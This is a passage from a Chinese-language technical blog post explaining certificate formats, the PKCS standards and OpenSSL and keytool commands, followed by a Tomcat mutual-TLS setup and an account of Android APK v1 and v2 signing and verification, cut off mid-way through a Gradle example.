PKCS#12,对*nix服务器来说,一般CRT和KEY是分开存放在不同文件中的,但Windows的IIS则将它们存在一个PFX文件中,(因此这个文件包含了证书及私钥)这样会不会不安全？应该不会,PFX通常会有一个”提取密码”</li></ul><blockquote><p>总结起来：crt cer约等于x509证书，key保存公钥或私钥，csr是证书签名请求，pfx包含证书和私钥</p></blockquote><h2 id="PKCS标准"><a href="#PKCS标准" class="headerlink" title="PKCS标准"></a>PKCS标准</h2><p>PKCS系列是 Public-Key Cryptography Standards ，是RSA制定的一系列的标准，注意前面的文件后缀，都不算是<strong>标准</strong>，只有X509和PKCS可以称为标准，<br>PKCS中经常使用的就是：PKCS1 PKCS8 PKCS12</p><ul><li>PEM - Privacy Enhanced Mail,打开看文本格式,以”—–BEGIN…”开头, “—–END…”结尾,内容是BASE64编码.</li></ul><p>查看PEM格式证书的信息:openssl x509 -in certificate.pem -text -noout<br>Apache和*NIX服务器偏向于使用这种编码格式.</p><ul><li><p>DER - Distinguished Encoding Rules,打开看是二进制格式,不可读.</p></li><li><p>PKCS#1：定义<strong>RSA</strong>公开密钥算法加密和签名机制，主要用于组织PKCS#7中所描述的数字签名和数字信封。</p></li><li><p>PKCS#2：涉及了RSA的消息摘要加密，这已被并入PKCS#1中。</p></li><li><p>PKCS#3：Diffie-Hellman密钥协议标准。PKCS#3描述了一种实现Diffie- Hellman密钥协议的方法。</p></li><li><p>PKCS#4：最初是规定RSA密钥语法的，现已经被包含进PKCS#1中。</p></li><li><p>PKCS#5：基于口令的加密标准。PKCS#5描述了使用由口令生成的密钥来加密8位位组串并产生一个加密的8位位组串的方法。PKCS#5可以用于加密私钥，以便于密钥的安全传输（这在PKCS#8中描述）。</p></li><li><p>PKCS#6：扩展证书语法标准。PKCS#6定义了提供附加实体信息的X.509证书属性扩展的语法（当PKCS#6第一次发布时，X.509还不支持扩展。这些扩展因此被包括在X.509中）。</p></li><li><p>PKCS#7：密码消息语法标准。PKCS#7为使用密码算法的数据规定了通用语法，比如数字签名和数字信封。PKCS#7提供了许多格式选项，包括未加密或签名的格式化消息、已封装（加密）消息、已签名消息和既经过签名又经过加密的消息。</p></li><li><p>PKCS#8：描述私有密钥信息格式，该信息包括公开密钥算法的私有密钥以及可选的属性集等。注意pkcs8不只是能表示RSA，所以比PKCS1更具有通用性</p></li><li><p>PKCS#9：可选属性类型。PKCS#9定义了PKCS#6扩展证书、PKCS#7数字签名消息、PKCS#8私钥信息和PKCS#10证书签名请求中要用到的可选属性类型。已定义的证书属性包括E-mail地址、无格式姓名、内容类型、消息摘要、签名时间、签名副本（counter signature）、质询口令字和扩展证书属性。</p></li><li><p>PKCS#10：证书请求语法标准。PKCS#10定义了证书请求的语法。证书请求包含了一个唯一识别名、公钥和可选的一组属性，它们一起被请求证书的实体签名（证书管理协议中的PKIX证书请求消息就是一个PKCS#10）。</p></li><li><p>PKCS#11：密码令牌接口标准。PKCS#11或“Cryptoki”为拥有密码信息（如加密密钥和证书）和执行密码学函数的单用户设备定义了一个应用程序接口（API）。智能卡就是实现Cryptoki的典型设备。注意：Cryptoki定义了密码函数接口，但并未指明设备具体如何实现这些函数。而且Cryptoki只说明了密码接口，并未定义对设备来说可能有用的其他接口，如访问设备的文件系统接口。</p></li><li><p>PKCS#12：描述个人信息交换语法标准。描述了将用户公钥、私钥、证书和其他相关信息打包的语法。</p></li><li><p>PDCS#13：椭圆曲线密码标准。PKCS#13标准当前正在完善之中。它包括椭圆曲线参数的生成和验证、密钥生成和验证、数字签名和公钥加密，还有密钥协定，以及参数、密钥和方案标识的ASN.1语法。</p></li><li><p>PKCS#14：伪随机数产生标准。PKCS#14标准当前正在完善之中。为什么随机数生成也需要建立自己的标准呢？PKI中用到的许多基本的密码学函数，如密钥生成和Diffie-Hellman共享密钥协商，都需要使用随机数。然而，如果“随机数”不是随机的，而是取自一个可预测的取值集合，那么密码学函数就不再是绝对安全了，因为它的取值被限于一个缩小了的值域中。因此，安全伪随机数的生成对于PKI的安全极为关键。</p></li><li><p>PKCS#15：密码令牌信息语法标准。PKCS#15通过定义令牌上存储的密码对象的通用格式来增进密码令牌的互操作性。在实现PKCS#15的设备上存储的数据对于使用该设备的所有应用程序来说都是一样的，尽管实际上在内部实现时可能所用的格式不同。PKCS#15的实现扮演了翻译家的角色，它在卡的内部格式与应用程序支持的数据格式间进行转换.</p></li></ul><blockquote><p>总结：PKCS1,8,12都可以在某些情况下当作文件格式，PKCS1描述基础的密钥格式，PKCS8也描述密钥，但格式和1不同，PKCS12等价于PFX文件，包含证书和私钥</p></blockquote><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><span class="hljs-meta"># 生成PKCS#1的公私钥</span><br>openssl genrsa -<span class="hljs-keyword">out</span> pkcs1_private.pem <span class="hljs-number">1024</span><br>openssl rsa -<span class="hljs-keyword">in</span> pkcs1_private.pem -RSAPublicKey_out -<span class="hljs-keyword">out</span> pkcs1_public.pem<br><br>查看私钥<br> openssl rsa -<span class="hljs-keyword">in</span> rsa_private_key.pem -text -noout<br>查看公钥<br>openssl rsa -pubin -<span class="hljs-keyword">in</span>  rsa_public_key.pem  -text<br><br><span class="hljs-meta"># 由PKCS#1的私钥，生成PKCS#8的公私钥</span><br>openssl pkcs8 -topk8 -inform PEM -<span class="hljs-keyword">in</span> pkcs1_private.pem -outform PEM -nocrypt -<span class="hljs-keyword">out</span> from_pkcs1_private_to_pkcs8_private.pem<br><br>openssl rsa -<span class="hljs-keyword">in</span> pkcs1_private.pem -pubout -<span class="hljs-keyword">out</span> from_pkcs1_private_to_pkcs8_public.pem<br><br><span class="hljs-meta"># 由PKCS#8的私钥，生成PKCS#1的公私钥</span><br>openssl rsa -<span class="hljs-keyword">in</span> from_pkcs1_private_to_pkcs8_private.pem -<span class="hljs-keyword">out</span> from_pkcs8_private_to_pkcs1_private.pem<br><br>openssl rsa -<span class="hljs-keyword">in</span> from_pkcs1_private_to_pkcs8_private.pem -RSAPublicKey_out -<span class="hljs-keyword">out</span> from_pkcs8_private_to_pkcs1_public.pem<br><br><span class="hljs-meta"># 由PKCS1公钥生成PKCS#8公钥:</span><br>openssl rsa -RSAPublicKey_in -<span class="hljs-keyword">in</span> pkcs1_public.pem -pubout -<span class="hljs-keyword">out</span> from_pkcs1_public_to_pkcs8_public.pem<br><br><span class="hljs-meta"># 由PKCS8公钥生成PKCS#1公钥:</span><br>openssl rsa -pubin -<span class="hljs-keyword">in</span> from_pkcs1_private_to_pkcs8_public.pem -RSAPublicKey_out -<span class="hljs-keyword">out</span> from_pkcs8_public_to_pkcs1_public.pem<br><br>产生证书请求 注意PKCS1 <span class="hljs-number">8</span>都可以<br>openssl req -<span class="hljs-keyword">new</span> -key private_key.pem -<span class="hljs-keyword">out</span> rsaCerReq.csr<br><br>产生证书 注意PKCS1 <span class="hljs-number">8</span>都可以<br>openssl x509 -req -days <span class="hljs-number">3650</span> -<span class="hljs-keyword">in</span> rsaCerReq.csr -signkey private_key.pem -<span class="hljs-keyword">out</span> rsaCert.crt<br><br>从证书获得公钥：<br>openssl x509 -<span class="hljs-keyword">in</span> rsaCert.crt  -noout  -pubkey  &gt; public_key.pem<br><br>生成PKCS12<br>openssl pkcs12 -export -inkey serverprikey.pem -<span class="hljs-keyword">in</span> server.pem -password pass:<span class="hljs-string">&quot;123456&quot;</span> -<span class="hljs-keyword">out</span> server_nocret.pfx<br><br><br>从PKCS12获得证书和私钥<br>openssl pkcs12 -<span class="hljs-keyword">in</span> server_nocret.pfx -nocerts -nodes  -<span class="hljs-keyword">out</span> alicekey.pem<br><br>openssl pkcs12 -<span class="hljs-keyword">in</span> server_nocret.pfx  -nokeys  -<span class="hljs-keyword">out</span> cert.pem<br><br>查看pkcs12内容 -nodes:因为私钥在在输出前会输出加密结果，所以需要nodes来保证不用打密码和不加密<br>openssl pkcs12 -<span class="hljs-keyword">in</span> server_nocret.pfx -nocerts -nodes  -<span class="hljs-keyword">out</span> alicekey.pem<br></code></pre></td></tr></table></figure><h2 id="SSL常见证书"><a href="#SSL常见证书" class="headerlink" title="SSL常见证书"></a>SSL常见证书</h2><p>根据不同的服务器以及服务器的版本，我们需要用到不同的证书格式，就市面上主流的服务器来说，大概有以下格式：</p><ul><li>.DER .CER，文件是二进制格式，只保存证书，不保存私钥。</li><li>.PEM，一般是文本格式，可保存证书，可保存私钥。</li><li>.CRT，可以是二进制格式，可以是文本格式，与 .DER 格式相同，不保存私钥。</li><li>.PFX .P12，二进制格式，同时包含证书和私钥，一般有密码保护。</li><li>.JKS，二进制格式，同时包含证书和私钥，一般有密码保护。</li></ul><h3 id="DER"><a href="#DER" class="headerlink" title="DER"></a>DER</h3><p>该格式是二进制文件内容，Java 和 Windows 服务器偏向于使用这种编码格式。</p><p>OpenSSL 查看:</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">openssl</span> x<span class="hljs-number">509</span> -in certificate.der -inform der -text -noout<br></code></pre></td></tr></table></figure><p>转换为 PEM：</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada">openssl x509 -<span class="hljs-keyword">in</span> cert.crt -inform der -outform pem -<span class="hljs-keyword">out</span> cert.pem<br></code></pre></td></tr></table></figure><h3 id="PEM"><a href="#PEM" class="headerlink" title="PEM"></a>PEM</h3><p>Privacy Enhanced Mail，一般为文本格式，以 <code>-----BEGIN...</code> 开头，以 <code>-----END...</code> 结尾。中间的内容是 BASE64 编码。这种格式可以保存证书和私钥，有时我们也把PEM 格式的私钥的后缀改为 .key 以区别证书与私钥。具体你可以看文件的内容。</p><p>这种格式常用于 Apache 和 Nginx 服务器。</p><p>OpenSSL 查看：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">openssl</span> x<span class="hljs-number">509</span> -in certificate.pem -text -noout<br></code></pre></td></tr></table></figure><p>转换为 DER：</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada">openssl x509 -<span class="hljs-keyword">in</span> cert.crt -outform der -<span class="hljs-keyword">out</span> cert.der<br></code></pre></td></tr></table></figure><h3 id="CRT"><a href="#CRT" class="headerlink" title="CRT"></a>CRT</h3><p>Certificate 的简称，有可能是 PEM 编码格式，也有可能是 DER 编码格式。如何查看请参考前两种格式。</p><h3 id="PFX"><a href="#PFX" class="headerlink" title="PFX"></a>PFX</h3><p>Predecessor of PKCS#12，这种格式是二进制格式，且证书和私钥存在一个 PFX 文件中。一般用于 Windows 上的 IIS 服务器。改格式的文件一般会有一个密码用于保证私钥的安全。</p><p>OpenSSL 查看：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">openssl</span> pkcs<span class="hljs-number">12</span> -in key.pfx<br></code></pre></td></tr></table></figure><p>转换为 PEM：</p><figure class="highlight sas"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sas">openssl pkcs12 -<span class="hljs-meta">in</span> <span class="hljs-meta">key</span>.pfx -<span class="hljs-meta">out</span> <span class="hljs-meta">key</span>.pem -nodes<br></code></pre></td></tr></table></figure><h3 id="JKS"><a href="#JKS" class="headerlink" title="JKS"></a>JKS</h3><p>Java Key Storage，很容易知道这是 JAVA 的专属格式，利用 JAVA 的一个叫 <code>keytool</code>的工具可以进行格式转换。一般用于 Tomcat 服务器。</p><p><a href="https://myssl.com/cert_convert.html">在线格式转换</a></p><h2 id="TOMCAT双向认证"><a href="#TOMCAT双向认证" class="headerlink" title="TOMCAT双向认证"></a>TOMCAT双向认证</h2><ol><li>使用keytool生成证书，成文keystore文件，ailas(别名)每个keystore都关联这一个独一无二的alias，这个alias通常不区分大小写</li></ol><p>在keystore里，包含两种数据： </p><ul><li> 密钥实体（Key entity）——密钥（secret key）又或者是私钥和配对公钥（采用非对称加密）</li><li>可信任的证书实体（trusted certificate entries）——只包含公钥</li></ul><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">keytool</span> -genkey -v -alias tomcat -keyalg RSA -keystore tomcat.keystore -validity <span class="hljs-number">36500</span><br></code></pre></td></tr></table></figure><ol start="2"><li>为客户端生成证书</li></ol><figure class="highlight elm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs elm"><span class="hljs-title">keytool</span> -genkey -v -<span class="hljs-keyword">alias</span> mykey -keyalg <span class="hljs-type">RSA</span> -store<span class="hljs-keyword">type</span> <span class="hljs-type">PKCS12</span> -keystore mykey.p12 <br></code></pre></td></tr></table></figure><ol start="3"><li>让服务器信任客户端证书</li></ol><p>由于是双向SSL认证，服务器必须要信任客户端证书，因此，必须把客户端证书添加为服务器的信任认证。由于不能直接将PKCS12格式的证书库导入，必须先把客户端证书导出为一个单独的CER文件，使用如下命令：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">keytool</span> -export -alias mykey -keystore mykey.p<span class="hljs-number">12</span> -storetype PKCS<span class="hljs-number">12</span> -storepass <span class="hljs-number">123456</span> -rfc -file mykey.cer   //PKCS#<span class="hljs-number">12</span>转cer<br></code></pre></td></tr></table></figure><p>将该cer文件导入到服务器的证书库，添加为一个信任证书。</p><figure class="highlight elm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs elm"><span class="hljs-title">keytool</span> -<span class="hljs-keyword">import</span> -v -file mykey.cer -keystore tomcat.keystore<br></code></pre></td></tr></table></figure><p>通过list命令查看服务器的证书库，可以看到两个证书，一个是服务器证书，一个是受信任的客户端证书：</p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lsl">keytool -<span class="hljs-type">list</span> -keystore tomcat.keystore<br></code></pre></td></tr></table></figure><ol start="4"><li>让客户端信任服务器证书</li></ol><p>由于是双向SSL认证，客户端也要验证服务器证书，因此，必须把服务器证书添加到浏览的“受信任的根证书颁发机构”。由于不能直接将keystore格式的证书库导入，必须先把服务器证书导出为一个单独的CER文件，使用如下命令。</p><figure class="highlight delphi"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs delphi">keytool -keystore tomcat.keystore -<span class="hljs-keyword">export</span> -<span class="hljs-keyword">alias</span> tomcat -<span class="hljs-keyword">file</span>  tomcat.cer -validity <span class="hljs-number">36500</span><br></code></pre></td></tr></table></figure><p>5.配置Tomcat服务器</p><p>打开Tomcat根目录下的/conf/server.xml，找到Connector port=”8443″配置段，修改为如下：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs routeros">&lt;Connector <span class="hljs-attribute">port</span>=”8443″ <span class="hljs-attribute">protocol</span>=”org.apache.coyote.http11.Http11NioProtocol”<br><br><span class="hljs-attribute">SSLEnabled</span>=”true” <span class="hljs-attribute">maxThreads</span>=”150″ <span class="hljs-attribute">scheme</span>=”https”<br><br><span class="hljs-attribute">secure</span>=”true” <span class="hljs-attribute">clientAuth</span>=”true” <span class="hljs-attribute">sslProtocol</span>=”TLS”<br><br><span class="hljs-attribute">keystoreFile</span>=”D:\\home\\tomcat.keystore” <span class="hljs-attribute">keystorePass</span>=”123456″<br><br><span class="hljs-attribute">truststoreFile</span>=”D:\\home\\tomcat.keystore” <span class="hljs-attribute">truststorePass</span>=”123456″ /&gt;<br></code></pre></td></tr></table></figure><p>属性说明：</p><figure class="highlight vbnet"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs vbnet"><span class="hljs-symbol">clientAuth:</span>设置是否双向验证，默认为<span class="hljs-literal">false</span>，设置为<span class="hljs-literal">true</span>代表双向验证<br><br><span class="hljs-symbol">keystoreFile:</span>服务器证书文件路径<br><br><span class="hljs-symbol">keystorePass:</span>服务器证书密码<br><br><span class="hljs-symbol">truststoreFile:</span>用来验证客户端证书的根证书，此例中就是服务器证书<br><br><span class="hljs-symbol">truststorePass:</span>根证书密码<br></code></pre></td></tr></table></figure><p>应用程序HTTP自动跳转到HTTPS(未测试)</p><p>在应用程序中web.xml中加入：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">security-constraint</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">web-resource-collection</span> &gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">web-resource-name</span> &gt;</span>SSL<span class="hljs-tag">&lt;/<span class="hljs-name">web-resource-name</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">url-pattern</span>&gt;</span>/*<span class="hljs-tag">&lt;/<span class="hljs-name">url-pattern</span>&gt;</span><br><br><span class="hljs-tag">&lt;/<span class="hljs-name">web-resource-collection</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">user-data-constraint</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">transport-guarantee</span>&gt;</span>CONFIDENTIAL<span class="hljs-tag">&lt;/<span class="hljs-name">transport-guarantee</span>&gt;</span><br><br><span class="hljs-tag">&lt;/<span class="hljs-name">user-data-constraint</span>&gt;</span><br><br><span class="hljs-tag">&lt;/<span class="hljs-name">security-constraint</span>&gt;</span><br></code></pre></td></tr></table></figure><h2 id="安卓签名"><a href="#安卓签名" class="headerlink" title="安卓签名"></a>安卓签名</h2><p>生成keystore文件</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">keytool</span> -genkey -alias android.keystore -keyalg RSA -validity <span class="hljs-number">36500</span> -keystore android.keystore<br></code></pre></td></tr></table></figure><p>签名：</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-keyword">jarsigner </span>-verbose -keystore xx.keystore  -storepass XXXXXX -signedjar <span class="hljs-keyword">android_sign.apk </span>-<span class="hljs-keyword">digestalg </span><span class="hljs-keyword">SHA1 </span>-sigalg MD5withRSA <span class="hljs-keyword">android.apk </span>别名<br><br><span class="hljs-keyword">android_sign.apk为签名后生成的apk文件</span><br><span class="hljs-keyword"></span><span class="hljs-keyword">android.apk为源apk文件</span><br></code></pre></td></tr></table></figure><h3 id="V1和V2签名"><a href="#V1和V2签名" class="headerlink" title="V1和V2签名"></a>V1和V2签名</h3><h4 id="签名工具"><a href="#签名工具" class="headerlink" title="签名工具"></a>签名工具</h4><pre><code>    Android 应用的签名工具有两种：jarsigner 和 signAPK。它们的签名算法没什么区别，主要是签名使用的文件不同。</code></pre><ul><li>jarsigner：jdk 自带的签名工具，可以对 jar 进行签名。使用 keystore 文件进行签名。生成的签名文件默认使用 keystore 的别名命名。</li><li>signAPK：Android sdk 提供的专门用于 Android 应用的签名工具。使用 pk8、x509.pem 文件进行签名。其中 pk8 是私钥文件，x509.pem 是含有公钥的文件。生成的签名文件统一使用“CERT”命名。</li></ul><h4 id="v1签名"><a href="#v1签名" class="headerlink" title="v1签名"></a>v1签名</h4><ol><li><p>MANIFEST.MF</p><p>该文件中保存的内容其实就是逐一遍历 APK 中的所有条目，如果是目录就跳过，如果是一个文件，就用 SHA1（或者 SHA256）消息摘要算法提取出该文件的摘要然后进行 BASE64 编码后，作为“SHA1-Digest”属性的值写入到 MANIFEST.MF 文件中的一个块中。该块有一个“Name”属性， 其值就是该文件在 APK 包中的路径。</p></li><li><p>CERT.SF</p></li></ol><ul><li><p>SHA1-Digest-Manifest-Main-Attributes：对 MANIFEST.MF 头部的块做 SHA1（或者SHA256）后再用 Base64 编码</p></li><li><p>SHA1-Digest-Manifest：对整个 MANIFEST.MF 文件做 SHA1（或者 SHA256）后再用 Base64 编码</p></li><li><p>SHA1-Digest：对 MANIFEST.MF 的各个条目做 SHA1（或者 SHA256）后再用 Base64 编码</p></li></ul><ol start="3"><li><p>CERT.RSA</p><p>这里会把之前生成的 CERT.SF 文件，用私钥计算出签名, 然后将签名以及包含公钥信息的数字证书一同写入 CERT.RSA 中保存。这里要注意的是，Android APK 中的 CERT.RSA 证书是自签名的，并不需要这个证书是第三方权威机构发布或者认证的，用户可以在本地机器自行生成这个自签名证书。Android 目前不对应用证书进行 CA 认证。</p><p>CERT.RSA文件：</p></li></ol> <img src="/2021/08/22/%E8%AF%81%E4%B9%A6%E4%BD%93%E7%B3%BB/images/CERTRSA%E6%96%87%E4%BB%B6.png" class=""><h5 id="签名过程"><a href="#签名过程" class="headerlink" title="签名过程"></a>签名过程</h5> <img src="/2021/08/22/%E8%AF%81%E4%B9%A6%E4%BD%93%E7%B3%BB/images/%E7%AD%BE%E5%90%8D%E8%BF%87%E7%A8%8B.png" class=""><h5 id="签名校验过程"><a href="#签名校验过程" class="headerlink" title="签名校验过程"></a>签名校验过程</h5><p>签名验证是发生在APK的安装过程中，一共分为三步：</p><ol><li><p>检查 APK 中包含的所有文件，对应的摘要值与 MANIFEST.MF 文件中记录的值一致。</p></li><li><p>使用证书文件（RSA 文件）检验签名文件（SF 文件）没有被修改过。</p></li><li><p>使用签名文件（SF 文件）检验 MF 文件没有被修改过</p></li></ol> <img src="/2021/08/22/%E8%AF%81%E4%B9%A6%E4%BD%93%E7%B3%BB/images/%E7%AD%BE%E5%90%8D%E6%A0%A1%E9%AA%8C%E8%BF%87%E7%A8%8B.png" class=""><h4 id="V2签名"><a href="#V2签名" class="headerlink" title="V2签名"></a>V2签名</h4><h5 id="v1签名的劣势"><a href="#v1签名的劣势" class="headerlink" title="v1签名的劣势"></a>v1签名的劣势</h5><p>从 Android 7.0 开始，Android 支持了一套全新的 V2 签名机制，通过前面的分析，可以发现 v1 签名有两个地方可以改进：</p><p>签名校验速度慢<br>校验过程中需要对apk中所有文件进行摘要计算，在 APK 资源很多、性能较差的机器上签名校验会花费较长时间，导致安装速度慢。</p><p>完整性保障不够<br>META-INF 目录用来存放签名，自然此目录本身是不计入签名校验过程的，可以随意在这个目录中添加文件，比如一些快速批量打包方案就选择在这个目录中添加渠道文件。</p><p>为了解决这两个问题，在 Android 7.0 Nougat 中引入了全新的 APK Signature Scheme v2。</p><h5 id="v2与v1不同"><a href="#v2与v1不同" class="headerlink" title="v2与v1不同"></a>v2与v1不同</h5><p>由于在 v1 仅针对单个 ZIP 条目进行验证，因此，在 APK 签署后可进行许多修改 — 可以移动甚至重新压缩文件。事实上，编译过程中要用到的 ZIPalign 工具就是这么做的，它用于根据正确的字节限制调整 ZIP 条目，以改进运行时性能。而且我们也可以利用这个东西，在打包之后修改 META-INF 目录下面的内容，或者修改 ZIP 的注释来实现多渠道的打包，在 v1 签名中都可以校验通过。</p><p>v2 签名将验证归档中的所有字节，而不是单个 ZIP 条目，因此，在签署后无法再运行 ZIPalign（必须在签名之前执行）。正因如此，现在，在编译过程中，Google 将压缩、调整和签署合并成一步完成。</p><h5 id="v2-签名模式"><a href="#v2-签名模式" class="headerlink" title="v2 签名模式"></a>v2 签名模式</h5><p>简单来说，v2 签名模式在原先 APK 块中增加了一个新的块（签名块），新的块存储了签名，摘要，签名算法，证书链，额外属性等信息，这个块有特定的格式。</p> <img src="/2021/08/22/%E8%AF%81%E4%B9%A6%E4%BD%93%E7%B3%BB/images/%E7%AD%BE%E5%90%8D%E5%AF%B9%E6%AF%94.png" class=""><h5 id="v2签名过程"><a href="#v2签名过程" class="headerlink" title="v2签名过程"></a>v2签名过程</h5><p>首先，说一下 APK 摘要计算规则，对于每个摘要算法，计算结果如下:</p><p>将 APK 中文件 ZIP 条目的内容、ZIP 中央目录、ZIP 中央目录结尾按照 1MB 大小分割成一些小块。<br>计算每个小块的数据摘要，数据内容是 0xa5 + 块字节长度 + 块内容。<br>计算整体的数据摘要，数据内容是 0x5a + 数据块的数量 + 每个数据块的摘要内容<br>总之，就是把 APK 按照 1M 大小分割，分别计算这些分段的摘要，最后把这些分段的摘要在进行计算得到最终的摘要也就是 APK 的摘要。然后将 APK 的摘要 + 数字证书 + 其他属性生成签名数据写入到 APK Signing Block 区块。</p><h5 id="签名校验过程-1"><a href="#签名校验过程-1" class="headerlink" title="签名校验过程"></a>签名校验过程</h5><p>其中 v2 签名机制是在 Android 7.0 以及以上版本才支持。因此对于 Android 7.0 以及以上版本，在安装过程中，如果发现有 v2 签名块，则必须走 v2 签名机制，不能绕过。否则降级走 v1 签名机制。<br>v1 和 v2 签名机制是可以同时存在的，其中对于 v1 和 v2 版本同时存在的时候，v1 版本的 META_INF 的 .SF 文件属性当中有一个 X-Android-APK-Signed 属性：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">X</span>-Android-APK-Signed: <span class="hljs-number">2</span><br></code></pre></td></tr></table></figure><p>因此如果想绕过 v2 走 v1 校验是不行的。</p><p>找到<code>APK 签名分块</code>并验证以下内容：<br>a. <code>APK 签名分块</code>的两个大小字段包含相同的值。<br>b. <code>ZIP 中央目录结尾</code>紧跟在<code>ZIP 中央目录</code>记录后面。<br>c. <code>ZIP 中央目录结尾</code>之后没有任何数据。</p><p>找到<code>APK 签名分块</code>中的第一个<code>APK 签名方案 v2 分块</code>。如果 v2 分块存在，则继续执行第 3 步。否则，回退至使用 v1 方案验证 APK。</p><p>对<code>APK 签名方案 v2 分块</code>中的每个 signer 执行以下操作：<br>a. 从 signatures 中选择安全系数最高的受支持 signature algorithm ID。安全系数排序取决于各个实现/平台版本。<br>b. 使用 public key 并对照<code>signed data</code> 验证 signatures 中对应的 signature。（现在可以安全地解析 <code>signed data</code>了。）<br>c. 验证 digests 和 signatures 中的签名算法 ID 列表（有序列表）是否相同。（这是为了防止删除/添加签名。）<br>d. 使用签名算法所用的同一种摘要算法计算 APK 内容的摘要。<br>e. 验证计算出的摘要是否与 digests 中对应的 digest 相同。<br>f. 验证 certificates 中第一个 certificate 的 SubjectPublicKeyInfo 是否与 public key 相同。</p><p>如果找到了至少一个 signer，并且对于每个找到的 signer，第 3 步都取得了成功，APK 验证将会成功。</p> <img src="/2021/08/22/%E8%AF%81%E4%B9%A6%E4%BD%93%E7%B3%BB/images/v2%E7%AD%BE%E5%90%8D.png" class=""><h5 id="兼容机制"><a href="#兼容机制" class="headerlink" title="兼容机制"></a>兼容机制</h5><p>因为V2签名机制是在Android 7.0中引入的，为了使APK可在Android 7.0以下版本中安装，应先用JAR签名对APK进行签名，再用V2方案进行签名。要注意顺序一定是先JAR签名再V2签名，因为JAR签名需要修改zip<code>数据区</code>和<code>中央目录</code>的内容，先使用V2签名再JAR签名会破坏V2签名的完整性。</p><p>实际上我们在编译APK时并不需要关心这个过程，在Android Plugin for Gradle 2.2中，gradle默认会同时使用JAR签名和V2方案对APK进行签名，如果想要关闭JAR签名或V2签名，可以在build.gradle中进行配置：</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">android &#123;<br>    <span class="hljs-string">...</span><br>    defaultConfig &#123; <span class="hljs-string">...</span> &#125;<br>    signingConfigs &#123;<br>        release &#123;<br>            <span class="hljs-string">...</span><br>            <span class="hljs-string">//</span> v1SigningEnabled <span class="hljs-literal">false</span><br>            